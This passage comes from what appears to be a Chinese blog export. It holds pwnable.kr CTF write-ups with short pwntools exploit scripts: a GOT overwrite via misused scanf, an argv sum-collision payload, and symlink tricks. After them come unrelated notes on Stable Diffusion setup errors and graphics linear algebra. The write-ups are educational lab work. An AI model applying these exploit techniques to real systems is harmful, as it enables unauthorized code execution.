<p>直接IDA打开，发现乱码，回来查壳，查到UPX</p>
<p>尝试直接脱壳，无阻碍，翻一下逻辑找到明文flag</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable靶场ak-WP （5）passcode 篡改GOT</title>
    <url>/pwnable-ba-chang/pwnable-ba-chang-ak-wp-5-passcode/</url>
    <content><![CDATA[<h2 id="写在前面">写在前面</h2>
<p>这个的预期解实在是太骚了(对于目前的菜鸡的我而言)，朝着三种比较常规的简单思路去做，发现都无法利用，最后看完预期解WP人都傻了，但是拓宽了很大的思路，记录如下</p>
<h2 id="错误解">错误解</h2>
<p>拿到题目第一反应一般都是welcom和login函数处于相同ebp上面，而且name变量有一个大得可疑的缓冲区，于是想要去溢出</p>
<p>但是计算过后会发现虽然缓冲区很大，但是正好差4，无法溢出</p>
<p>然后会去在scanf下手，但是仔细看会发现（可能不太好看出来；IDA标红了，提示未初始化的局部变量）这里的scanf其实是错误用法，我们实际上不能向这两个int变量输入目标值</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049489.png" /></p>
<p>然后笔者就没辙了2333</p>
<h2 id="预期解">预期解</h2>
<p>记录一下别的师傅的预期解</p>
<p>r00tk1t师傅的笔记非常让人拓宽眼界</p>
<p>另外非常感谢LIGHTFOOT姐姐的笔记，可谓是循循善诱</p>
<p>首先，身为二进制安全选手，要转变对scanf这类函数的看法，因为这种函数能做到一个非常重要而敏感的作用：<strong>写入</strong></p>
<p>而且不一定只是写入大量数据从而溢出这么简单（事实上scanf也不能溢出，gets才可以）</p>
<p>在本题中，仅仅用一个scanf函数，便控制了两个写入操作，最终使得system函数执行</p>
<p>理论操作如下</p>
<p>首先我们要观察出，这里的scanf被程序员（程序开发者）误用了，他传过去的实际上是int，但是会被解读为指向目标IO区域的指针</p>
<p>这点非常重要</p>
<p>如果是一个正常使用的scanf，我们就不能进行GOT覆盖操作了，因为向scanf传递的地址是addr（伪）指令动态获取的，存放这个int变量的地址早就定好了，根本不存在覆写，即使覆写也只是覆写了这个地址处的变量，而这个地址是定死的，指向特定局部变量</p>
<p>换句话来说，这种误用<strong>本质上</strong>产生了一个<strong>非常高危的敏感行为</strong>——<strong>将一个可以作为全局地址的指针暴露在可被覆写的局部变量栈上</strong></p>
<p>这在实际生产中基本等同于任意代码执行漏洞，具体到本题中，我们也确实拉起了system进程</p>
<p>那么接下来怎么办？</p>
<p>首先找system函数的地址，然后找到前面一句传参的地址，记下后者的地址</p>
<p>我们在找到fflush的地址——这个函数可以理解为出题人特意为我们留下的90 90空闲区</p>
<p>我们现在要做的是：</p>
<p>首先，在welcome中，用name覆盖掉passwd1的内容，这个内容覆盖为fflush的GOT地址，由于ebp相同且局部变量堆栈不清空，这种覆盖很好实现</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049231.png" /></p>
<p>第二部，scanf做出敏感操作：向fflush写入内容，具体写入的内容是system函数前面的传参指令的地址</p>
<p>这样，我们就会<strong>向 fflush 处写入 system 地址</strong>——<strong>scanf不一定只操作一个地址</strong></p>
<h2 id="小细节">小细节</h2>
<p>我们向程序输入的任何内容都是默认视作字符的，至于数字或者0x，\x这类东西，能够被解释为特殊意义，完全是程序内部操作</p>
<p>如果仅仅是程序获取输入内容的话，它获取到的仅仅是字符而已</p>
<p>我们在pwntool写的时候可以用0x十六进制，但是像这种，中间还需要操作一下scanf的，而且scanf的format还是%d</p>
<p>这时就需要输入十进制了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">134514147</span><br></pre></td></tr></table></figure>
<h2 id="解题脚本">解题脚本</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#conn=remote(&quot;128.61.240.205&quot;,9000)</span><br><span class="line">conn=ssh(&#x27;passcode&#x27;,&quot;128.61.240.205&quot;,2222,&quot;guest&quot;)</span><br><span class="line"># conn=ssh(&#x27;root&#x27;,&quot;192.168.84.129&quot;,22,&quot;1&quot;)</span><br><span class="line">p=conn.process(&quot;./passcode&quot;)</span><br><span class="line">p.sendline(&#x27;AAAA&#x27;*24+p32(0x0804A004))</span><br><span class="line">p.sendline(&#x27;134514147&#x27;)</span><br><span class="line">print(p.recvall())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable靶场ak-WP （6）random</title>
    <url>/pwnable-ba-chang/pwnable-ba-chang-ak-wp-6-random/</url>
    <content><![CDATA[<p>题目原理比较简单，主要是补两个笔记</p>
<h2 id="补充1">补充1</h2>
<p>首先，众所周知，rand函数的种子固定时是产生的序列就是固定的</p>
<p>但是在不同操作系统环境下，这个序列不一定是相同的</p>
<p>主流Linux发行版rand的第一个值是0x6b8b4567，而Windows是41</p>
<p>线性同余算法不一定能达到周期上限，如果要达到周期上限，需要模除右操作数与同余式尾项互质</p>
<h2 id="补充2">补充2</h2>
<p>补一个pwndbg笔记，内容有限，仅放一些基础</p>
<p>启动时传参文件路径</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049313.png" /></p>
<p>或者在启动后用file传参</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049998.png" /></p>
<p><code>b</code>下断点，加*的数字表示地址，不加*的数字表示函数名（但是实际上C类语言并不允许纯数字的函数名）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049878.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049686.png" /></p>
<p><code>disassemble</code>用来反汇编</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049512.png" /></p>
<p><code>delete</code>或者<code>d</code>用来删除断点</p>
<p>缺省删除所有断点，可以加参数，删除特定断点</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049845.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049696.png" /></p>
<p><code>info b</code>查看当前所有断点</p>
<p><code>r</code>运行程序</p>
<p><code>reg</code>查看寄存器</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049535.png" /></p>
<p>可以看到EAX(RAX)的值是0x6b8b4567</p>
<p>这就是rand的固定第一个值</p>
<p>另外查看堆栈：</p>
<p><code>x/nfu &lt;addr&gt;</code>或者<code>stack</code></p>
<p>x 是 examine 的缩写</p>
<p>n表示要显示的内存单元的个数</p>
<p>f表示显示方式, 可取如下值<br />
x 按十六进制格式显示变量。<br />
d 按十进制格式显示变量。<br />
u 按十进制格式显示无符号整型。<br />
o 按八进制格式显示变量。<br />
t 按二进制格式显示变量。<br />
a 按十六进制格式显示变量。<br />
i 指令地址格式<br />
c 按字符格式显示变量。<br />
f 按浮点数格式显示变量。</p>
<p>u表示一个地址单元的长度<br />
b表示单字节，<br />
h表示双字节，<br />
w表示四字节，<br />
g表示八字节</p>
<p>另外还可以用stack来查看堆栈</p>
<p>然后是各种参数中含有寄存器时，寄存器都需要$符号</p>
<p>比如</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049014.png" /></p>
<p>另外VScode远程调试是真的舒服</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050301.png" /></p>
<p>需要改一下最大保存行数</p>
<p>笔者这里直接改成十万行，这下子就够用了233</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable靶场ak-WP （7）input2</title>
    <url>/pwnable-ba-chang/pwnable-ba-chang-ak-wp-7-input2/</url>
    <content><![CDATA[<p>先补一个pwntool传参的笔记和一个python构造list的好方法</p>
<h2 id="补充1">补充1</h2>
<p>pwntool的argv传参有个很神奇的地方</p>
<p>他甚至能篡改argv[0]的值,没翻源码,实现暂时未知,不过不影响</p>
<p>创建方法为</p>
<p><code>connect.process(list : argv,str : path)</code></p>
<h2 id="补充2">补充2</h2>
<p>如果有一个很长的list,其中大部分元素的值为垃圾填充,只有小部分为有用值,那么错误做法是append,太傻了</p>
<p>正确做法是生成一个全为填充值的list,然后抓几个特殊的地方出来</p>
<h2 id="wp">WP</h2>
<p>the very vital point that I didn't notice that need be metioned at first</p>
<p>If you excu an ELF then you will carry identify of the ELF's owner</p>
<p>the main_check func need a file named"\x0a",so we need create such file,while we don't have permission in the.floder</p>
<p>so we need goto tmp floder and use utility <code>ln</code> to create soft-link,which only need link dest-floder writing permission</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -fs  ~/flag flag</span><br><span class="line">ln -fs  ~/input input</span><br></pre></td></tr></table></figure>
<p>for now on,every step operates on tmp-link ver file</p>
<p>and hold on a min ,le't talk about permission of create a hard-link and soft-link file</p>
<p>if we'd like to create a hard-link ,the sufficient condition is,we have read+write permission on target file,if <code>fs.protected_hardlinks == true</code> and have write &amp; <strong>execu</strong> permission of destdir.if`<code>fs.protected_hardlinks == 0</code> no permission needed on target file,even 000 is okay.</p>
<p>what surprise me is execu permission,its purpose is preventing a situation that's similar to this quzz--if hack have access to tmp floder,which normally is gloabally permitted,the hack can execu or open wrong file,due to relative path</p>
<p>for soft-link the requires is lower,only need source-dir have execu and dest-dir have write+execu</p>
<p>for target file ,its permission is no need to care</p>
<p>come back to main topic</p>
<p>after create link we need notice that relative path have a relative vulnerability ,make soft-link to cheat execu with wrong file</p>
<p>secondly,there is a sock programming needed ,considering webbench project ,this time we try use C to pwn rather than pwntool</p>
<h2 id="poc">poc</h2>
<p>（under construction..）</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable靶场ak-WP（2）col MD5碰撞</title>
    <url>/pwnable-ba-chang/pwnable-ba-chang-ak-wp-2-col-md5-peng-zhuang/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>这个题目之前第一次写的时候指针学的不扎实，有非常多的问题，这次打算不适用IDA的F5直接分析汇编</p>
<p>得到了很多经验</p>
<h2 id="正文">正文</h2>
<p>连接，ls查看，发现关键文件col，下载回来本地，IDA分析</p>
<p>关键函数.text:08048494 Check()</p>
<p>关键参数重命名后如下</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181055772.png" /></p>
<p>注意橙色箭头的ADD，正是这个操作导致IDA误报了数据类型为int，这让我在第一次做这个的时候非常麻烦，其实这里是直接对地址操作，滑套理念，把所有东西都看作是纯粹的DW数据，只是一个纯粹的数字罢了，这样思考就方便理解多了</p>
<p>同时注意红色箭头的后续跟进操作</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056535.png"  /></p>
<p>xref找到hashcode</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056185.png" /></p>
<p>这里是简单的sum碰撞</p>
<p>几个容易混的要点，一个地址代表一个字节，一个地址是一个最小单位，一个字节是有操作意义的最小单位，32位总线每次传输一个双字（DWord，四字节），一个双字指针指向一个字节，但代表了四个字节全体</p>
<p>另外一个很重要的是，大小端的字节序和栈增长方向这两个东西，前者是相对于元素内部的字节顺序，后者相对于元素本身的顺序，后者把元素看作了质点，前者研究系统内部，不能看作是质点</p>
<h2 id="补充">补充</h2>
<p>补一个argv的方向问题，本题当中挺重要的，这里讨论的前提是默认状态下32位Linux系统</p>
<p>假设有一个程序main.elf，对他argv传参 \xc8\xce\xc5\x06 即：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./main.elf \xc8\xce\xc5\x06</span><br></pre></td></tr></table></figure>
<p>那么谁先入栈argv?</p>
<p>答案是最右侧的\x06，同时栈向下增长，最后最低位是\xc8</p>
<p>用自然语言书写顺序就是06C5CEC8h</p>
<p>所以可以确定，argv参数入栈和一般的函数参数入栈顺序一样，都是先push最右边的参数</p>
<h2 id="wp脚本">WP脚本</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">a = p32(113626824)</span><br><span class="line">b = p32(113626828)</span><br><span class="line">payload = a*4 + b</span><br><span class="line">print (payload)</span><br><span class="line">p=process([&#x27;./col&#x27;,payload])</span><br><span class="line">print(p.recvall())</span><br></pre></td></tr></table></figure>
<h2 id="补充2">补充2</h2>
<p>recv系类函数返回值是str，需要加一句print</p>
<p>C语言程序的argv参数是不支持<strong>标准输入流命令</strong>的，需要使用getopt</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>stable-diffusion 部署踩坑</title>
    <url>/ren-gong-zhi-neng/stable-diffusion-bu-shu-cai-keng/</url>
    <content><![CDATA[<p>问题一 RuntimeError: Couldn't install open_clip.</p>
<p>解决 https://github.com/CompVis/stable-diffusion/issues/661 原因: GFW防火墙</p>
<p>问题二 No matching distribution found for gradio==3.23</p>
<p>https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/8896 原因:国内源太老了, 还是得用国外源+翻墙</p>
<p>问题三 RuntimeError: self.size(-1) must be divisible by 4 to view Byte as Float (different element sizes), but got 16268507RuntimeError: self.size(-1) must be divisible by 4 to view Byte as Float (different element sizes), but got 16268507RuntimeError: self.size(-1) must be divisible by 4 to view Byte as Float (different element sizes), but got 16268507</p>
<p>https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/8653 原因:下载时断流了, 程序侧没有设计断流重连, 因此二进制包损坏</p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>AI绘画</tag>
      </tags>
  </entry>
  <entry>
    <title>图形学笔记1</title>
    <url>/tu-xing-xue-bi-ji/tu-xing-xue-bi-ji-1/</url>
    <content><![CDATA[<p>参考资料:https://www.bilibili.com/video/BV1X7411F744 GAMES 101</p>
<ol type="1">
<li><p>本系列不直接关注OpenGL的使用, 主要是探讨技术原理</p></li>
<li><p>计算机视觉和图形学的关系</p>
<ol type="1">
<li><p>什么是model, model是一种序列化后的数据(非文本的数据), 用于表示三维空间的物体, 而渲染就是把这些数据转换成图片的过程</p></li>
<li><p>计算机视觉有点类似于render的逆过程, 是把图片转换成模型数据的过程</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071534909.png" alt="" /><figcaption>image-20230407153404878</figcaption>
</figure></li>
<li><p>计算机视觉一般需要人工智能介入</p></li>
</ol></li>
</ol>
<p>一些网站:</p>
<p>https://games-cn.org/intro-graphics/</p>
<p>https://sites.cs.ucsb.edu/~lingqi/teaching/games101.html</p>
]]></content>
      <categories>
        <category>图形学笔记</category>
      </categories>
      <tags>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>图形学笔记2 线性代数基础</title>
    <url>/tu-xing-xue-bi-ji/tu-xing-xue-bi-ji-2/</url>
    <content><![CDATA[<h2 id="线性代数">线性代数</h2>
<h3 id="向量">向量</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071558367.png" alt="image-20230407155644349" style="zoom:50%;" /></p>
<h3 id="向量规范化-向量归一化">向量规范化/ 向量归一化</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071558565.png" alt="image-20230407155714165" style="zoom:50%;" /></p>
<h3 id="向量点乘">向量点乘</h3>
<p>点乘的结果是数 而不是向量</p>
<p>向量点乘采用cos 余弦作为变换模量</p>
<p>此时弹幕说可以用来检测AI视觉范围, 这里留疑问, 具体是不是这样做的等待以后解决</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071559388.png" alt="image-20230407155758550" style="zoom:50%;" /></p>
<h3 id="笛卡尔坐标系下的点乘的矩阵表达形式">笛卡尔坐标系下的点乘的矩阵表达形式</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071600950.png" alt="image-20230407160059910" style="zoom:50%;" /></p>
<h3 id="点乘可以用来找投影">点乘可以用来找投影</h3>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071605000.png" alt="" /><figcaption>image-20230407160525965</figcaption>
</figure>
<p>如果我们要计算b在a上的投影向量, 本质上是计算一个向量, 既然要计算一个向量就需要确定他的长度和方向, 方向已经确定了是a同方向的, 因为投影是在a上的, 那么长度定义为k</p>
<p>k等与b投影的绝对值, 也就等与b的绝对值乘以cosθ</p>
<p>这里的a向量是单位向量, 也就是目标"墙体"的方向上的单位向量 , 所以点乘的a模带换成了1, 所以k的式子其实是a和b点乘, 其中a 是单位向量</p>
<h3 id="点乘可以用来求相对方向">点乘可以用来求相对方向</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071611272.png" alt="image-20230407161125235" style="zoom:50%;" /></p>
<p>点乘为负数说明相对方向相反</p>
<h3 id="点乘可以描述两个向量有多接近">点乘可以描述两个向量有多接近</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071616002.png" alt="image-20230407161614966" style="zoom:50%;" /></p>
<p>如果a是单位向量, 当结果k接近1的时候, a和b就是一对接近的向量</p>
<p>应用: 当摄像机的向量接近入射光线向量的时候, 亮度最大, 当角度偏转, 接近程度逐渐变小的时候, 亮度逐渐变小, 直到某个阈值, 完全看不见入射光</p>
<h3 id="叉乘和叉乘的矩阵表达形式">叉乘和叉乘的矩阵表达形式</h3>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071623418.png" alt="" /><figcaption>image-20230407162308384</figcaption>
</figure>
<p>本质上是输入的两个向量确定一个平面, 这个平面的法线方向的一个特定长度的向量</p>
<p>由于向量起始点可以随意确定, 所以两个输入向量共享起始点, 三点确定一个平面</p>
<p>用右手, 从输入向量1往输入向量2的方向旋转, 确定结果向量的方向</p>
<p>结果向量的长度需要乘以sinθ作为变换模</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071652765.png" alt="image-20230407165223732" style="zoom:50%;" /></p>
<p>左边的矩阵，来自于a向量的坐标：分别是x y z变成0 然后其他的元素分别向下循环位移， 被优先向下移动的那一项 添加负号</p>
<p>右边的矩阵：b向量的坐标</p>
<p>矩阵求向量叉乘</p>
<h3 id="叉乘应用">叉乘应用</h3>
<ol type="1">
<li>在给定坐标系中确定左和右的相对位置</li>
</ol>
<p>​ 由于坐标系已经确定, 所以可以通过叉乘确定两个向量的左右关系, 因为叉乘的正负结果是与输入顺序有关的 所以因此叉乘没有交换律</p>
<ol start="2" type="1">
<li>新建一个坐标系</li>
</ol>
<p>​ 先给出一个面(通过两个向量确定一个面) 然后叉乘求出来纵深方向的坐标轴</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071650740.png" alt="image-20230407165021707" style="zoom:50%;" /></p>
<ol start="3" type="1">
<li>确定某一点是否在三角形内部</li>
</ol>
<p>​ <img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071650394.png" alt="image-20230407165055358" style="zoom:50%;" /></p>
<p>分别叉乘AB AP、BC BP、CP CA，如果符号都相同， 说明在内部，如果符号有一个不相同， 那么p点离那条边最近， 且P点在三角形外部</p>
<h3 id="点乘和叉乘的应用">点乘和叉乘的应用</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071658410.png" alt="image-20230407165849374" style="zoom:50%;" /></p>
<p>首先两个向量伽桑一个叉乘（或者三个向量）新建一个坐标系</p>
<p>然后由于前面那三个向量是单位向量，所以我们再给一个新的向量p的话，可以直接用点乘求这个向量在上面三个坐标轴上面的投影</p>
<h2 id="矩阵">矩阵</h2>
<p>m行n列矩阵 表示为m×n 先行后列</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071701934.png" alt="image-20230407170101907" style="zoom:50%;" /></p>
<h3 id="矩阵乘法">矩阵乘法</h3>
<p>比较基础不讲了</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071703511.png" alt="image-20230407170316477" style="zoom:50%;" /></p>
<p>应用： 只有当需要计算结果的第几行第几列才会去输入矩阵中找对应输入元素， 也就是说延迟求值</p>
<p>矩阵乘法的每一个结果元素， 有点类似点乘， 也是乘起来然后加在一起</p>
<p>比如我们要求结果的row2，Column4</p>
<p>这样需要在左边矩阵找所有的row2元素， 单拿出来 做一个转置， 变成竖向</p>
<p>右边的矩阵找所有的Column4元素， 拿出来， 也是竖的</p>
<p>二者点乘， 得到结果</p>
<h3 id="矩阵乘法没有交换律">矩阵乘法没有交换律</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071709153.png" alt="image-20230407170947118" style="zoom:50%;" /></p>
<h3 id="转置矩阵">转置矩阵</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071720594.png" alt="image-20230407172010561" style="zoom:50%;" /></p>
<p>转置一个矩阵乘法表达式会导致括号拆开， 然后反过来乘法顺序</p>
<h3 id="向量两种乘法的矩阵表达形式">向量两种乘法的矩阵表达形式</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071722819.png" alt="image-20230407172214780" style="zoom:50%;" /></p>
]]></content>
      <categories>
        <category>图形学笔记</category>
      </categories>
      <tags>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>图形学笔记3 变换矩阵 transformation</title>
    <url>/tu-xing-xue-bi-ji/tu-xing-xue-bi-ji-3/</url>
    <content><![CDATA[<h3 id="变换矩阵">变换矩阵</h3>
<p>之前很奇怪, 为什么按比例缩放不直接乘一个系数, 而是乘一个矩阵, 这样不是计算起来更慢吗, 其实这里面的原因是为了和其他操作统一起来</p>
<p>在二维的情况下</p>
<p>transform matrix样式为:</p>
<p><span class="math display">\[
\left[
\begin{matrix}
a &amp; b \\
c &amp; d
\end{matrix}
\right]
\]</span></p>
<p><strong>变换矩阵就相当于矩阵右乘得到的线性组合</strong></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304072151553.png" alt="image-20230407215125527" style="zoom:50%;" /></p>
<p>二维的理解方式是</p>
<p>$$ </p>
<p>=</p>
<p>x+ y= + = $$ 普通的理解方式(直接):</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304072159420.png" alt="image-20230407215903397" style="zoom:50%;" /></p>
<p><strong>也就是说, 有两种理解方式</strong></p>
<p><strong>第一种理解方式, 直接按照矩阵乘法方式去理解, 第一步 用a和b算出来x' 第二步用 c和d算出来y'</strong></p>
<p><strong>第二种理解方式 用矩阵右乘的线性组合去理解, 第一步用a和c算出来半个x'和y' 第二步用b和d算出来另外半个x'和y' 然后加在一起</strong></p>
<p>下面是一些例子</p>
<h3 id="等比例缩放">等比例缩放</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304092052319.png" alt="image-20230407210926847" style="zoom:50%;" /></p>
<p>首先是最常用的, 主对角线上的缩放因子分别是对图片的x和y方向进行缩放</p>
<h3 id="不等比例缩放">不等比例缩放</h3>
<p>下面的例子是两个缩放因子不相等的情况(不按照原图比例的缩放Non-uniform):</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304072113898.png" alt="" /><figcaption>image-20230407211312877</figcaption>
</figure>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304072111445.png" alt="image-20230407211128412" style="zoom:50%;" /></p>
<h3 id="轴对称变换">轴对称变换</h3>
<p>还有一个例子, 那就是轴对称</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304072114917.png" alt="image-20230407211457875" style="zoom:50%;" /></p>
<p>副对角线在上面的情况下都是0, 但是也有不是0的情况</p>
<h3 id="切变shear">切变shear</h3>
<p>那就是带有<strong>线性拉伸</strong>的"切变"(shear)变换:</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304072121811.png" alt="image-20230407212103771" style="zoom:50%;" /></p>
<p>分析流程: 首先y都没变化 所以第二行可以确定是0和1</p>
<p>然后观察到拉伸程度是线性变换的, 也就是说, 拉伸相同角度的话, 距离原点越远, 拉伸的长度会越长, 因此x的变换是一个基于拉伸长度/拉伸角度的表达式</p>
<p>为了方便, 我们用最终拉伸长度来表达每个点的拉伸长度, 因为他们(矩形的左边那条边)是在一条直线上的, 所以拉伸是等比例的</p>
<p>所以最终变换矩阵如图所示</p>
<h3 id="上述研究过程中的思考方法">上述研究过程中的思考方法</h3>
<p>学习到的思考方法: 为了写出一个变换, 我们需要观察四组原图和变换后图的点的关系, 变换后的点的位置既可能与变换前的x有关也可能与y有关, 也可能同时与x和y有关</p>
<h3 id="旋转变换">旋转变换</h3>
<p>如果不给出旋转中心点和方向, 默认中心点是原点, 方向是逆时针</p>
<p><strong>这里是根据角度旋转, 还有一种旋转方式是, 从坐标轴旋转到目标向量位置, 参见笔记4下</strong></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304072130733.png" alt="image-20230407213055695" style="zoom:50%;" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304072132317.png" alt="image-20230407213206276" style="zoom:50%;" /></p>
<p><span class="math display">\[
\left[
\begin{matrix}
\cos \theta &amp; -\sin \theta \\
\sin \theta &amp; \cos \theta
\end{matrix}
\right]
\]</span></p>
<h3 id="齐次坐标与平移变换">齐次坐标与平移变换</h3>
<p>首先关注到平移变化</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081348830.png" alt="image-20230408134736266" style="zoom:50%;" /></p>
<p>不能够用单一的变换矩阵描述, 必须要加个常数</p>
<p>为了统一平移变换和旋转、缩放等变换，引入齐次坐标，用三维的数据表达二维的点</p>
<p>其次坐标的最后一维度的变量本质上是一个分母</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081349374.png" alt="image-20230408134927352" style="zoom:50%;" /></p>
<p>下图是一个形象描述（https://www.zhihu.com/question/59595799）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081350046.png" alt="image-20230408135007009" style="zoom:75%;" /></p>
<p>这样就可以统一平移变化， 不需要加一个常数矩阵，只需要像旋转变换那样乘以一个齐次坐标下的矩阵就可以了：<strong>（仿射变换转换成矩阵乘法）</strong></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081351596.png" alt="image-20230408135129560" style="zoom: 80%;" /></p>
<p>需要注意的一点是， 在齐次坐标系中， 点的坐标的w值都为1， 因为w相当于分母，w等于1的话，相当于除1，等于其本身</p>
<p>但是为什么向量的w值都为0？</p>
<p>首先需要知道：齐次坐标不是我们中学和大一阶段学习的<strong>欧几里得几何</strong>，他属于<strong>非欧几何</strong>，首先需要证明非欧几何<strong>引理1：平行线交于一点，求该点坐标</strong></p>
<p>证明过程：http://www.songho.ca/math/homogeneous/homogeneous.html</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081356949.png" alt="" /><figcaption>image-20230408135636923</figcaption>
</figure>
<p>另外再折腾一句</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081401346.png" alt="image-20230408140117325" style="zoom: 80%;" /></p>
<p>这里w所确定的平面，是映射出来的，他不完全等同于xy确定的平面然后平移过去</p>
<p>既然证得平行线相交于点（x，y，0）所以我们定义向量的w值是0，因为向量的本质是一组平行线</p>
<p>另外还需要注意的是，如果定义点的w为1，向量的w为0，可以很好的满足：</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081359585.png" alt="image-20230408135951557" style="zoom:50%;" /></p>
<p>还需要指出的是，点加上点，在齐次坐标中相当于求得两点之间的中点，因为w值变成2了</p>
<p>所以在其次坐标中，求中点时避免了直接运算除法</p>
<h3 id="阶段性总结齐次坐标下的-缩放旋转平移">阶段性总结：齐次坐标下的 缩放、旋转、平移</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081409388.png" alt="image-20230408140920342" style="zoom:67%;" /></p>
<h3 id="变换的合成">变换的合成</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081420069.png" alt="image-20230408142050039" style="zoom:50%;" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081421894.png" alt="image-20230408142159863" style="zoom:50%;" /></p>
<p>矩阵的运算没有交换律但是有结合律</p>
<p><code>所以TRA转换成T（RA）</code>离坐标矩阵近的先被计算</p>
<p>当然，也可以事先把所有需要的矩阵乘起来，变成单一的变换矩阵</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081428292.png" alt="" /><figcaption>image-20230408142814258</figcaption>
</figure>
<h3 id="逆变换和逆矩阵">逆变换和逆矩阵</h3>
<p>（待添加）</p>
<h3 id="三维空间的拓展">三维空间的拓展</h3>
<p>齐次坐标表示如下</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081430199.png" alt="image-20230408143001176" style="zoom:50%;" /></p>
<p>变换矩阵通项公式：</p>
